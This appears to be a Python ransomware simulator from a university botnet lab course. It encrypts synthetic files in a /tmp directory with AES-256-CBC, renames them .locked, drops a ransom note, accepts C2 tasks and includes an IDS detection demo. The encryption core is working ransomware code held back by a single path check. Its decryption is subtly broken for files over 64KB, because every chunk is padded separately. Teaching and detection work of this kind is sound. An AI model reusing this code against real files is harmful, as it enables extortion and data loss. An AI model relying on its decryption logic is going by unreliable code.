"""
====================================================
 AUA CS 232/337 - Botnet Research Project
 Component: Ransomware Simulation (Attack + Defense)
 Environment: ISOLATED VM LAB ONLY
====================================================

Attack side (RansomwareSim):
  Demonstrates AES-256-CBC file encryption as used by ransomware.

  HARD SAFETY CONSTRAINT — enforced in code, not just policy:
    This simulator ONLY operates on /tmp/ransomware_lab_target/.
    It creates this directory itself and populates it with synthetic
    test files. It REFUSES to encrypt any path outside this directory.
    The check is in _validate_path() and is called before every
    file operation.

  What is demonstrated:
    - AES-256-CBC streaming file encryption (64KB chunks)
    - Key derivation from a "ransom key" using PBKDF2
    - Per-file IV derived from file hash (no IV reuse)
    - File renaming with .locked extension
    - Ransom note creation (README_DECRYPT.txt)
    - Full decryption (key recovery simulation)
    - Progress reporting back to C2

  What real ransomware adds (documented, not implemented):
    - Key exfiltration to C2 before local encryption
    - Shadow copy deletion (vssadmin delete — Windows)
    - Backup directory targeting
    - Network share enumeration and encryption
    - Asymmetric key wrapping (RSA wraps AES key)

Defense side (IDS Engine 22C):
  Full detection is in ids_engine_endpoint.py.
  This module adds:
    - Mass rename simulation for testing the detector
    - Ransom note scanner
    - Write velocity monitor

MITRE: T1486 (Data Encrypted for Impact)
       T1490 (Inhibit System Recovery — VSS deletion reference)

CLI:
  python3 ransomware_sim.py --setup          (create test dir + files)
  python3 ransomware_sim.py --encrypt        (encrypt test files)
  python3 ransomware_sim.py --decrypt        (decrypt test files)
  python3 ransomware_sim.py --status         (show test dir state)
  python3 ransomware_sim.py --cleanup        (delete test dir)
  python3 ransomware_sim.py --detect         (IDS Engine 22C demo)
  python3 ransomware_sim.py --demo           (full cycle: setup→encrypt→detect→decrypt→cleanup)
"""

import os
import sys
import time
import json
import glob
import shutil
import hashlib
import secrets
import argparse
import threading
from datetime import datetime
from pathlib import Path
from collections import defaultdict, deque

try:
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad, unpad
    from Crypto.Protocol.KDF import PBKDF2
    CRYPTO_OK = True
except ImportError:
    CRYPTO_OK = False
    print("[RansomSim] WARNING: pycryptodome not installed. "
          "pip3 install pycryptodome")


# ════════════════════════════════════════════════════════════════
#  SAFETY CONSTANTS — enforced in code
# ════════════════════════════════════════════════════════════════

LAB_TARGET_DIR  = "/tmp/ransomware_lab_target"
LOCKED_EXT      = ".locked"
RANSOM_NOTE     = "README_DECRYPT.txt"
RANSOM_NOTE_MSG = """\
[AUA CS 232/337 RESEARCH LAB — SIMULATED RANSOMWARE]

This is a RESEARCH SIMULATION. Your files in:
  {target_dir}

have been encrypted with AES-256-CBC for educational purposes.

Encryption key ID: {key_id}
Files encrypted:   {n_files}
Encrypted at:      {timestamp}

To decrypt: python3 ransomware_sim.py --decrypt
(In real ransomware this would require a payment)

MITRE ATT&CK: T1486 (Data Encrypted for Impact)
"""

RANSOM_KEY_PASSPHRASE = b"AUA_LAB_2026_RANSOM_KEY"  # fixed for reversibility
PBKDF2_SALT           = b"botnet_lab_salt_2026"
PBKDF2_ITERATIONS     = 100_000
CHUNK_SIZE            = 64 * 1024  # 64 KB


# ════════════════════════════════════════════════════════════════
#  KEY DERIVATION
# ════════════════════════════════════════════════════════════════

def derive_key(passphrase: bytes = RANSOM_KEY_PASSPHRASE) -> bytes:
    """
    Derive AES-256 key from passphrase using PBKDF2-HMAC-SHA256.
    In real ransomware: key is generated fresh per victim, encrypted
    with the attacker's RSA public key, and exfiltrated to C2 before
    any local encryption begins. Without the C2 private key, recovery
    is impossible.
    """
    if not CRYPTO_OK:
        return b"\x00" * 32
    return PBKDF2(
        passphrase, PBKDF2_SALT,
        dkLen=32, count=PBKDF2_ITERATIONS,
        prf=lambda p, s: __import__("hmac").new(p, s, "sha256").digest()
    )

def derive_iv(file_path: str) -> bytes:
    """
    Derive a unique 16-byte IV from the file path hash.
    Each file gets a different IV — CBC with reused IV leaks XOR
    of plaintexts, which is a well-known weakness.
    """
    h = hashlib.sha256(file_path.encode()).digest()
    return h[:16]


# ════════════════════════════════════════════════════════════════
#  PATH SAFETY VALIDATOR
# ════════════════════════════════════════════════════════════════

def _validate_path(path: str) -> None:
    """
    Enforce the hard constraint that encryption only touches
    files inside LAB_TARGET_DIR.

    Raises ValueError if path is outside the lab directory.
    This is called before every file open.
    """
    real_target = os.path.realpath(LAB_TARGET_DIR)
    real_path   = os.path.realpath(path)
    if not real_path.startswith(real_target + os.sep) and \
       real_path != real_target:
        raise ValueError(
            f"SAFETY VIOLATION: path '{path}' is outside "
            f"the lab target directory '{LAB_TARGET_DIR}'. "
            f"Operation refused."
        )


# ════════════════════════════════════════════════════════════════
#  FILE ENCRYPTION / DECRYPTION
# ════════════════════════════════════════════════════════════════

def encrypt_file(path: str, key: bytes) -> dict:
    """
    AES-256-CBC encrypt a single file in-place.
    Original file is overwritten; .locked extension appended.

    Teaching point: in ransomware the original file is usually
    securely deleted after encryption (overwrite with zeros before
    unlink) to prevent recovery via file carving. Here we just
    rename for easy reversal.
    """
    _validate_path(path)

    if not CRYPTO_OK:
        return {"status": "error", "reason": "pycryptodome missing"}

    iv     = derive_iv(path)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    dest   = path + LOCKED_EXT

    try:
        with open(path, "rb") as src, open(dest, "wb") as dst:
            while True:
                chunk = src.read(CHUNK_SIZE)
                if not chunk:
                    break
                dst.write(cipher.encrypt(pad(chunk, AES.block_size)))
        os.remove(path)
        return {
            "status":   "encrypted",
            "original": path,
            "locked":   dest,
            "size":     os.path.getsize(dest),
        }
    except Exception as e:
        # Clean up partial output on error
        if os.path.exists(dest):
            os.remove(dest)
        return {"status": "error", "reason": str(e)}


def decrypt_file(path: str, key: bytes) -> dict:
    """
    AES-256-CBC decrypt a .locked file back to its original.
    """
    _validate_path(path)

    if not path.endswith(LOCKED_EXT):
        return {"status": "skip", "reason": "not a .locked file"}

    if not CRYPTO_OK:
        return {"status": "error", "reason": "pycryptodome missing"}

    original = path[:-len(LOCKED_EXT)]
    iv       = derive_iv(original)
    cipher   = AES.new(key, AES.MODE_CBC, iv)

    try:
        with open(path, "rb") as src, open(original, "wb") as dst:
            buf = b""
            while True:
                chunk = src.read(CHUNK_SIZE)
                if not chunk:
                    break
                buf += cipher.decrypt(chunk)
            dst.write(unpad(buf, AES.block_size))
        os.remove(path)
        return {
            "status":    "decrypted",
            "recovered": original,
            "locked":    path,
        }
    except Exception as e:
        if os.path.exists(original):
            os.remove(original)
        return {"status": "error", "reason": str(e)}


# ════════════════════════════════════════════════════════════════
#  RANSOMWARE SIMULATOR
# ════════════════════════════════════════════════════════════════

class RansomwareSim:
    """
    Safe ransomware simulator — operates only in LAB_TARGET_DIR.

    Lifecycle:
      1. setup()    — create synthetic test files
      2. encrypt()  — encrypt all files, drop ransom note
      3. status()   — show current directory state
      4. decrypt()  — restore all files
      5. cleanup()  — delete the entire test directory
    """

    SYNTHETIC_FILES = [
        ("documents/report_q3.txt",     "Quarterly report data...\n" * 50),
        ("documents/budget_2026.csv",    "Category,Amount\nSalary,50000\n" * 30),
        ("photos/vacation.jpg.fake",     b"\xff\xd8\xff\xe0" + b"\x00" * 200),
        ("photos/family.png.fake",       b"\x89PNG\r\n\x1a\n" + b"\x00" * 200),
        ("work/project_notes.md",        "# Project Notes\n\nTODO: finish lab\n" * 40),
        ("work/credentials_backup.txt",  "user=labuser pass=labpass\n" * 5),
        ("personal/diary.txt",           "Dear diary, today I ran a botnet lab...\n" * 30),
    ]

    def __init__(self):
        self._key    = derive_key()
        self._key_id = hashlib.sha256(self._key).hexdigest()[:16]
        self._target = Path(LAB_TARGET_DIR)

    # ── Setup ─────────────────────────────────────────────────

    def setup(self) -> dict:
        """Create the lab target directory with synthetic test files."""
        if self._target.exists():
            print(f"[RansomSim] Target already exists: {LAB_TARGET_DIR}")
            return {"status": "exists", "path": LAB_TARGET_DIR}

        self._target.mkdir(parents=True)
        created = []
        for rel_path, content in self.SYNTHETIC_FILES:
            full = self._target / rel_path
            full.parent.mkdir(parents=True, exist_ok=True)
            mode = "wb" if isinstance(content, bytes) else "w"
            with open(full, mode) as f:
                if isinstance(content, bytes):
                    f.write(content)
                else:
                    f.write(content)
            created.append(str(full))

        print(f"[RansomSim] Created {len(created)} test files in {LAB_TARGET_DIR}")
        return {"status": "ready", "path": LAB_TARGET_DIR,
                "files": len(created)}

    # ── Encrypt ──────────────────────────────────────────────

    def encrypt(self, progress_callback=None) -> dict:
        """
        Encrypt all files in LAB_TARGET_DIR.
        Drops ransom note after completion.
        """
        if not self._target.exists():
            return {"status": "error", "reason": "Run --setup first"}

        files = [
            str(p) for p in self._target.rglob("*")
            if p.is_file() and not p.name.endswith(LOCKED_EXT)
               and p.name != RANSOM_NOTE
        ]

        if not files:
            return {"status": "already_encrypted_or_empty"}

        results = []
        for i, fpath in enumerate(files):
            result = encrypt_file(fpath, self._key)
            results.append(result)
            if progress_callback:
                progress_callback(i + 1, len(files), result)
            else:
                status = "✓" if result["status"] == "encrypted" else "✗"
                print(f"  {status} {os.path.relpath(fpath, LAB_TARGET_DIR)}")
            time.sleep(0.02)  # slight delay — mirrors real ransomware throttling

        # Drop ransom note
        note_path = self._target / RANSOM_NOTE
        with open(note_path, "w") as f:
            f.write(RANSOM_NOTE_MSG.format(
                target_dir=LAB_TARGET_DIR,
                key_id=self._key_id,
                n_files=len([r for r in results
                              if r["status"] == "encrypted"]),
                timestamp=datetime.now().isoformat(),
            ))

        encrypted = sum(1 for r in results if r["status"] == "encrypted")
        print(f"\n[RansomSim] Encrypted {encrypted}/{len(files)} files")
        print(f"[RansomSim] Ransom note: {note_path}")

        return {
            "status":     "encrypted",
            "n_files":    encrypted,
            "key_id":     self._key_id,
            "note":       str(note_path),
            "results":    results,
        }

    # ── Decrypt ──────────────────────────────────────────────

    def decrypt(self) -> dict:
        """Decrypt all .locked files — simulates key recovery."""
        if not self._target.exists():
            return {"status": "error", "reason": "No target directory"}

        locked = [
            str(p) for p in self._target.rglob(f"*{LOCKED_EXT}")
        ]

        if not locked:
            return {"status": "nothing_to_decrypt"}

        results = []
        for fpath in locked:
            result = decrypt_file(fpath, self._key)
            results.append(result)
            status = "✓" if result["status"] == "decrypted" else "✗"
            print(f"  {status} {os.path.relpath(fpath, LAB_TARGET_DIR)}")
            time.sleep(0.02)

        # Remove ransom note
        note = self._target / RANSOM_NOTE
        if note.exists():
            note.unlink()

        decrypted = sum(1 for r in results if r["status"] == "decrypted")
        print(f"\n[RansomSim] Decrypted {decrypted}/{len(locked)} files")
        return {
            "status":    "decrypted",
            "n_files":   decrypted,
            "results":   results,
        }

    # ── Status ───────────────────────────────────────────────

    def status(self) -> dict:
        """Show current state of the target directory."""
        if not self._target.exists():
            return {"status": "not_setup"}

        all_files    = list(self._target.rglob("*"))
        plaintext    = [f for f in all_files if f.is_file()
                        and not str(f).endswith(LOCKED_EXT)
                        and f.name != RANSOM_NOTE]
        locked       = [f for f in all_files if str(f).endswith(LOCKED_EXT)]
        note_exists  = (self._target / RANSOM_NOTE).exists()

        return {
            "path":           str(self._target),
            "plaintext_files": len(plaintext),
            "locked_files":   len(locked),
            "ransom_note":    note_exists,
            "state": (
                "encrypted" if locked and note_exists else
                "partially_encrypted" if locked else
                "decrypted" if plaintext and not locked else
                "empty"
            ),
        }

    # ── Cleanup ──────────────────────────────────────────────

    def cleanup(self):
        """Remove the entire test directory."""
        if self._target.exists():
            shutil.rmtree(self._target)
            print(f"[RansomSim] Cleaned up {LAB_TARGET_DIR}")
        else:
            print(f"[RansomSim] Nothing to clean up")


# ════════════════════════════════════════════════════════════════
#  C2 TASK HANDLER
# ════════════════════════════════════════════════════════════════

_sim = RansomwareSim()

def handle_c2_task(task: dict) -> dict:
    """
    Handle C2 tasks for ransomware simulation.

    Task types:
      {"type": "ransom_setup"}
      {"type": "ransom_encrypt"}
      {"type": "ransom_decrypt"}
      {"type": "ransom_status"}
      {"type": "ransom_cleanup"}
    """
    t = task.get("type")
    progress = []

    if t == "ransom_setup":
        return _sim.setup()
    elif t == "ransom_encrypt":
        def cb(i, total, result):
            progress.append(result)
        result = _sim.encrypt(progress_callback=cb)
        return result
    elif t == "ransom_decrypt":
        return _sim.decrypt()
    elif t == "ransom_status":
        return _sim.status()
    elif t == "ransom_cleanup":
        _sim.cleanup()
        return {"status": "cleaned"}
    return {"error": f"unknown task: {t}"}


# ════════════════════════════════════════════════════════════════
#  DETECTION SIDE: IDS Engine 22C standalone demo
# ════════════════════════════════════════════════════════════════

def run_detection_demo():
    """
    Trigger Engine 22C detection by simulating mass renames.
    Imports ids_engine_endpoint.py if available.
    """
    print("[IDS-E22C] Ransomware detection demo...")
    print("[IDS-E22C] Simulating mass rename events at high rate...")

    try:
        from ids_engine_endpoint import RansomwareDetector
        det = RansomwareDetector()

        for i in range(30):
            det.observe_rename(
                pid=9999,
                old_path=f"/tmp/ransomware_lab_target/docs/file_{i}.txt",
                new_path=f"/tmp/ransomware_lab_target/docs/file_{i}.txt.locked",
                process_name="ransomware_sim",
            )
            time.sleep(0.05)

        det.observe_file_create(
            "/tmp/ransomware_lab_target/README_DECRYPT.txt"
        )
        print("[IDS-E22C] Detection demo complete.")
    except ImportError:
        print("[IDS-E22C] ids_engine_endpoint.py not found — "
              "showing detection IOCs only:\n")
        print("  IOC 1: File rename rate > 20/sec from one process")
        print("  IOC 2: New extension '.locked', '.encrypted', '.crypto'")
        print("  IOC 3: File named 'README_DECRYPT.txt', 'HOW_TO_RESTORE.txt'")
        print("  IOC 4: Disk write bandwidth spike > baseline")
        print("  MITRE: T1486 (Data Encrypted for Impact)")


# ════════════════════════════════════════════════════════════════
#  CLI
# ════════════════════════════════════════════════════════════════

if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Ransomware Simulation — LAB ONLY (operates in /tmp only)")
    parser.add_argument("--setup",   action="store_true")
    parser.add_argument("--encrypt", action="store_true")
    parser.add_argument("--decrypt", action="store_true")
    parser.add_argument("--status",  action="store_true")
    parser.add_argument("--cleanup", action="store_true")
    parser.add_argument("--detect",  action="store_true")
    parser.add_argument("--demo",    action="store_true",
                        help="Full cycle: setup → encrypt → detect → decrypt → cleanup")
    args = parser.parse_args()

    sim = RansomwareSim()

    if args.status:
        print(json.dumps(sim.status(), indent=2))

    if args.setup:
        print(f"[RansomSim] Setting up test directory: {LAB_TARGET_DIR}")
        result = sim.setup()
        print(json.dumps(result, indent=2))

    if args.encrypt:
        print(f"[RansomSim] Encrypting files in {LAB_TARGET_DIR}...")
        result = sim.encrypt()
        print(f"[RansomSim] Key ID: {result.get('key_id')}")

    if args.decrypt:
        print(f"[RansomSim] Decrypting files in {LAB_TARGET_DIR}...")
        sim.decrypt()

    if args.cleanup:
        sim.cleanup()

    if args.detect:
        run_detection_demo()

    if args.demo:
        print("=" * 60)
        print(" Ransomware Simulation — Full Demo Cycle")
        print("=" * 60)

        print("\n[1/5] Setup: creating test files...")
        sim.setup()
        time.sleep(0.5)

        print(f"\n[2/5] Status (before):")
        print(json.dumps(sim.status(), indent=2))

        print("\n[3/5] Encrypting...")
        sim.encrypt()

        print(f"\n[4/5] Status (after encryption):")
        print(json.dumps(sim.status(), indent=2))

        print("\n[5/5] IDS Detection demo...")
        run_detection_demo()

        print("\n[+] Decrypting (key recovery)...")
        sim.decrypt()

        print("\n[+] Cleanup...")
        sim.cleanup()

        print("\n[Demo complete] Full ransomware lifecycle demonstrated.")
